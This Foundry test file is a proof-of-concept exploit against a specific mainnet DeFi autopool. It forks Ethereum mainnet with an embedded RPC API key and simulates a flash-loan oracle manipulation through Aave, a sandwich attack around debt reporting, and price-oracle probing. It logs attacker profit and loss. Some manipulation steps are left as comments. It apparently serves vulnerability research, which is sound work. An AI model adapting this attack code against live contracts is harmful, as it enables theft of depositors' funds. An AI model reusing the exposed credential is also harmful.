// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// ============ INTERFACES ============

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IAutopool {
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function updateDebtReporting(uint256 numToProcess) external;
    function getAssetBreakdown() external view returns (
        uint256 totalIdle,
        uint256 totalDebt,
        uint256 totalDebtMin,
        uint256 totalDebtMax
    );
    function convertToAssets(uint256 shares) external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function asset() external view returns (address);
}

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        address assetIn;
        address assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId) external view returns (
        address[] memory tokens,
        uint256[] memory balances,
        uint256 lastChangeBlock
    );
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);
}

interface IFlashLoanSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IDestinationVault {
    function getRangePricesLP() external returns (uint256 spotPrice, uint256 safePrice, bool isSpotSafe);
    function getUnderlyerCeilingPrice() external returns (uint256 price);
}

// ============ EXPLOIT CONTRACT ============

contract OracleManipulationExploit is Test, IFlashLoanSimpleReceiver {
    // Target contracts
    address constant AUTOPOOL = 0xa7569A44f348d3D70d8ad5889e50F78E33d80D35;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    // Destination vault with Balancer exposure
    address constant DEST_VAULT = 0x34d81fC5582fc7d38F26fC322F92955154D3dC7d;

    // Balancer pool ID (need to determine exact pool)
    bytes32 constant BALANCER_POOL_ID = 0x85b2b559bc2d21104c4defdd6efca8a20343361d000000000000000000000000;

    // Debt reporting executor (for sandwich scenario)
    address constant REPORTING_EXECUTOR = 0x1A65E4844a3AF0F1733ee9e1A474dc7DB3c396a3;

    // State for flash loan callback
    uint256 public attackPhase;
    uint256 public initialNavPerShare;
    uint256 public manipulatedNavPerShare;

    // Test state
    IAutopool autopool;
    IERC20 usdc;

    function setUp() public {
        // Fork mainnet at recent block
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");

        autopool = IAutopool(AUTOPOOL);
        usdc = IERC20(USDC);

        console.log("=== SETUP ===");
        console.log("Block number:", block.number);
        console.log("Autopool address:", AUTOPOOL);
        console.log("Total assets:", autopool.totalAssets());
        console.log("Total supply:", autopool.totalSupply());
    }

    /// @notice Test 1: Verify we can read current state and prices
    function test_ReadCurrentState() public {
        console.log("\n=== TEST 1: Read Current State ===");

        uint256 totalAssets = autopool.totalAssets();
        uint256 totalSupply = autopool.totalSupply();

        console.log("Total Assets (USDC):", totalAssets / 1e6);
        console.log("Total Supply (shares):", totalSupply / 1e18);

        // NAV per share
        if (totalSupply > 0) {
            uint256 navPerShare = (totalAssets * 1e18) / totalSupply;
            console.log("NAV per share (1e18 scale):", navPerShare);
            console.log("NAV per share ($):", navPerShare * 1e6 / 1e18);
        }

        // Get asset breakdown
        (uint256 idle, uint256 debt, uint256 debtMin, uint256 debtMax) = autopool.getAssetBreakdown();
        console.log("\nAsset Breakdown:");
        console.log("  Total Idle:", idle / 1e6, "USDC");
        console.log("  Total Debt:", debt / 1e6, "USDC");
        console.log("  Total Debt Min:", debtMin / 1e6, "USDC");
        console.log("  Total Debt Max:", debtMax / 1e6, "USDC");

        // Calculate spread
        if (debtMax > 0) {
            uint256 spread = ((debtMax - debtMin) * 10000) / debtMax;
            console.log("  Debt Spread (bps):", spread);
        }

        assertTrue(totalAssets > 0, "Pool has assets");
    }

    /// @notice Test 2: Check destination vault prices directly
    function test_DestinationVaultPrices() public {
        console.log("\n=== TEST 2: Destination Vault Prices ===");

        // Try to call getRangePricesLP on destination vault
        IDestinationVault destVault = IDestinationVault(DEST_VAULT);

        try destVault.getRangePricesLP() returns (uint256 spot, uint256 safe, bool isSafe) {
            console.log("Destination Vault:", DEST_VAULT);
            console.log("  Spot Price:", spot);
            console.log("  Safe Price:", safe);
            console.log("  Is Spot Safe:", isSafe);

            if (spot > 0 && safe > 0) {
                int256 divergence = int256(spot) - int256(safe);
                console.log("  Price Divergence:", divergence);
            }
        } catch {
            console.log("Could not query destination vault prices directly");
        }
    }

    /// @notice Test 3: Simulate Balancer pool manipulation impact
    function test_BalancerPoolState() public {
        console.log("\n=== TEST 3: Balancer Pool State ===");

        IBalancerVault vault = IBalancerVault(BALANCER_VAULT);

        // Query pool tokens
        try vault.getPoolTokens(BALANCER_POOL_ID) returns (
            address[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        ) {
            console.log("Pool tokens:");
            for (uint i = 0; i < tokens.length; i++) {
                console.log("  Token", i, ":", tokens[i]);
                console.log("    Balance:", balances[i]);
            }
            console.log("Last change block:", lastChangeBlock);
        } catch {
            console.log("Could not query Balancer pool - may need different pool ID");
        }
    }

    /// @notice Test 4: Measure price impact of debt reporting
    function test_DebtReportingImpact() public {
        console.log("\n=== TEST 4: Debt Reporting Impact ===");

        // Record state before
        (uint256 idleBefore, uint256 debtBefore, uint256 minBefore, uint256 maxBefore) = autopool.getAssetBreakdown();
        uint256 totalAssetsBefore = autopool.totalAssets();

        console.log("Before debt reporting:");
        console.log("  Total Assets:", totalAssetsBefore / 1e6, "USDC");
        console.log("  Debt Min:", minBefore / 1e6);
        console.log("  Debt Max:", maxBefore / 1e6);

        // Impersonate the reporting executor
        vm.startPrank(REPORTING_EXECUTOR);

        // Trigger debt reporting
        try autopool.updateDebtReporting(10) {
            console.log("\nDebt reporting executed successfully");
        } catch Error(string memory reason) {
            console.log("Debt reporting failed:", reason);
        } catch {
            console.log("Debt reporting failed with unknown error");
        }

        vm.stopPrank();

        // Record state after
        (uint256 idleAfter, uint256 debtAfter, uint256 minAfter, uint256 maxAfter) = autopool.getAssetBreakdown();
        uint256 totalAssetsAfter = autopool.totalAssets();

        console.log("\nAfter debt reporting:");
        console.log("  Total Assets:", totalAssetsAfter / 1e6, "USDC");
        console.log("  Debt Min:", minAfter / 1e6);
        console.log("  Debt Max:", maxAfter / 1e6);

        // Calculate changes
        int256 assetChange = int256(totalAssetsAfter) - int256(totalAssetsBefore);
        console.log("\nAsset change:", assetChange);
    }

    /// @notice Test 5: Full attack simulation with flash loan
    function test_FlashLoanAttack() public {
        console.log("\n=== TEST 5: Flash Loan Attack Simulation ===");

        // Get initial state
        uint256 initialAssets = autopool.totalAssets();
        uint256 initialSupply = autopool.totalSupply();
        initialNavPerShare = (initialAssets * 1e18) / initialSupply;

        console.log("Initial NAV/share:", initialNavPerShare);

        // Deal ourselves some USDC for the attack
        uint256 attackerCapital = 1_000_000 * 1e6; // 1M USDC
        deal(USDC, address(this), attackerCapital);

        console.log("Attacker capital:", attackerCapital / 1e6, "USDC");

        // Record pre-attack balance
        uint256 preAttackBalance = usdc.balanceOf(address(this));

        // === PHASE 1: Measure manipulation potential ===
        console.log("\n--- Phase 1: Measuring manipulation potential ---");

        // Get Balancer pool state
        // We would swap to skew the pool here

        // === PHASE 2: Execute flash loan attack ===
        console.log("\n--- Phase 2: Flash loan execution ---");

        // Flash loan amount
        uint256 flashLoanAmount = 10_000_000 * 1e6; // 10M USDC

        // Approve USDC for repayment
        usdc.approve(AAVE_POOL, type(uint256).max);
        usdc.approve(AUTOPOOL, type(uint256).max);
        usdc.approve(BALANCER_VAULT, type(uint256).max);

        // Execute flash loan
        attackPhase = 1;

        try IAavePool(AAVE_POOL).flashLoanSimple(
            address(this),
            USDC,
            flashLoanAmount,
            "",
            0
        ) {
            console.log("Flash loan executed successfully");
        } catch Error(string memory reason) {
            console.log("Flash loan failed:", reason);
        } catch (bytes memory) {
            console.log("Flash loan failed with low-level error");
        }

        // Record post-attack balance
        uint256 postAttackBalance = usdc.balanceOf(address(this));

        console.log("\n=== ATTACK RESULTS ===");
        console.log("Pre-attack balance:", preAttackBalance / 1e6, "USDC");
        console.log("Post-attack balance:", postAttackBalance / 1e6, "USDC");

        if (postAttackBalance > preAttackBalance) {
            uint256 profit = postAttackBalance - preAttackBalance;
            console.log("PROFIT:", profit / 1e6, "USDC");
        } else {
            uint256 loss = preAttackBalance - postAttackBalance;
            console.log("LOSS:", loss / 1e6, "USDC");
        }
    }

    /// @notice Flash loan callback - this is where the attack happens
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        console.log("\n--- Inside Flash Loan Callback ---");
        console.log("Borrowed:", amount / 1e6, "USDC");
        console.log("Premium:", premium / 1e6, "USDC");

        // === STEP 1: Manipulate Balancer pool ===
        console.log("\n[Step 1] Manipulating Balancer pool...");

        // Approve Balancer vault
        IERC20(asset).approve(BALANCER_VAULT, amount);

        // Get pre-manipulation prices
        (uint256 idlePre, uint256 debtPre, uint256 minPre, uint256 maxPre) = autopool.getAssetBreakdown();
        console.log("Pre-manipulation debt min:", minPre / 1e6);
        console.log("Pre-manipulation debt max:", maxPre / 1e6);

        // Execute swap to skew pool (simplified - in real attack would use specific pool)
        // This is where we would manipulate the Balancer StablePool

        // === STEP 2: Trigger debt reporting (sandwich or direct) ===
        console.log("\n[Step 2] Triggering debt reporting...");

        // Impersonate reporting executor and trigger update
        vm.startPrank(REPORTING_EXECUTOR);
        try autopool.updateDebtReporting(10) {
            console.log("Debt reporting succeeded");
        } catch {
            console.log("Debt reporting failed (expected if no manipulation)");
        }
        vm.stopPrank();

        // Get post-manipulation prices
        (uint256 idlePost, uint256 debtPost, uint256 minPost, uint256 maxPost) = autopool.getAssetBreakdown();
        console.log("\nPost-debt-reporting min:", minPost / 1e6);
        console.log("Post-debt-reporting max:", maxPost / 1e6);

        // Calculate if manipulation was successful
        int256 minChange = int256(minPost) - int256(minPre);
        int256 maxChange = int256(maxPost) - int256(maxPre);
        console.log("Min change:", minChange);
        console.log("Max change:", maxChange);

        // === STEP 3: Exploit mispricing ===
        console.log("\n[Step 3] Exploiting mispricing...");

        // If prices were manipulated lower, deposit to get more shares
        // If prices were manipulated higher, we would have deposited before

        uint256 depositAmount = 100_000 * 1e6; // 100K USDC
        if (usdc.balanceOf(address(this)) >= depositAmount) {
            usdc.approve(AUTOPOOL, depositAmount);

            uint256 sharesBefore = IERC20(AUTOPOOL).balanceOf(address(this));
            try autopool.deposit(depositAmount, address(this)) returns (uint256 shares) {
                console.log("Deposited:", depositAmount / 1e6, "USDC");
                console.log("Received shares:", shares / 1e18);

                // Calculate effective price paid
                uint256 effectivePrice = (depositAmount * 1e18) / shares;
                console.log("Effective price per share:", effectivePrice);
            } catch {
                console.log("Deposit failed");
            }
        }

        // === STEP 4: Reverse manipulation ===
        console.log("\n[Step 4] Reversing manipulation...");
        // Would swap back to restore pool state

        // === STEP 5: Prepare repayment ===
        uint256 amountOwed = amount + premium;
        console.log("\nAmount owed:", amountOwed / 1e6, "USDC");
        console.log("Current balance:", usdc.balanceOf(address(this)) / 1e6, "USDC");

        // Approve repayment
        IERC20(asset).approve(msg.sender, amountOwed);

        return true;
    }

    /// @notice Test 6: Sandwich attack simulation
    function test_SandwichAttack() public {
        console.log("\n=== TEST 6: Sandwich Attack Simulation ===");

        // This simulates a sandwich around a legitimate debt reporting call

        // Give attacker USDC
        uint256 attackerCapital = 500_000 * 1e6;
        deal(USDC, address(this), attackerCapital);

        // FRONT-RUN: Deposit before debt reporting (if we expect prices to go up)
        console.log("\n--- Front-run: Deposit before manipulation ---");

        usdc.approve(AUTOPOOL, attackerCapital);
        uint256 sharesBefore = autopool.deposit(attackerCapital, address(this));
        console.log("Deposited:", attackerCapital / 1e6, "USDC");
        console.log("Received shares:", sharesBefore / 1e18);

        // VICTIM TRANSACTION: Legitimate debt reporting
        console.log("\n--- Victim: Debt reporting executes ---");
        vm.prank(REPORTING_EXECUTOR);
        autopool.updateDebtReporting(10);

        // BACK-RUN: Check our position value
        console.log("\n--- Back-run: Check position value ---");

        uint256 sharesOwned = IERC20(AUTOPOOL).balanceOf(address(this));
        uint256 assetsRedeemable = autopool.convertToAssets(sharesOwned);

        console.log("Shares owned:", sharesOwned / 1e18);
        console.log("Redeemable assets:", assetsRedeemable / 1e6, "USDC");

        // Calculate profit/loss
        if (assetsRedeemable > attackerCapital) {
            console.log("PROFIT:", (assetsRedeemable - attackerCapital) / 1e6, "USDC");
        } else {
            console.log("LOSS:", (attackerCapital - assetsRedeemable) / 1e6, "USDC");
        }
    }

    /// @notice Test 7: Price oracle manipulation measurement
    function test_OracleManipulationMeasurement() public {
        console.log("\n=== TEST 7: Oracle Manipulation Measurement ===");

        // Query the BalancerV3StableMathOracle directly
        address oracle = 0x792587B191eb0169DA6bEeFa592859b47F0651Fe;

        // Get current spot price from destination vault
        IDestinationVault destVault = IDestinationVault(DEST_VAULT);

        console.log("Querying destination vault for price data...");

        // Measure baseline
        try destVault.getRangePricesLP() returns (uint256 spot, uint256 safe, bool isSafe) {
            console.log("BASELINE:");
            console.log("  Spot price:", spot);
            console.log("  Safe price:", safe);
            console.log("  Is safe:", isSafe);

            // Now simulate a large swap that would manipulate the pool
            // In a real attack, we'd swap a large amount to skew balances

            // After swap (simulation), query again
            // The difference would show manipulation potential
        } catch {
            console.log("Could not query prices - vault may use different interface");
        }

        // Also test the ceiling/floor prices
        try destVault.getUnderlyerCeilingPrice() returns (uint256 ceiling) {
            console.log("\nCeiling price (documented as attackable):", ceiling);
        } catch {
            console.log("Could not get ceiling price");
        }
    }

    // Receive function for any ETH
    receive() external payable {}
}
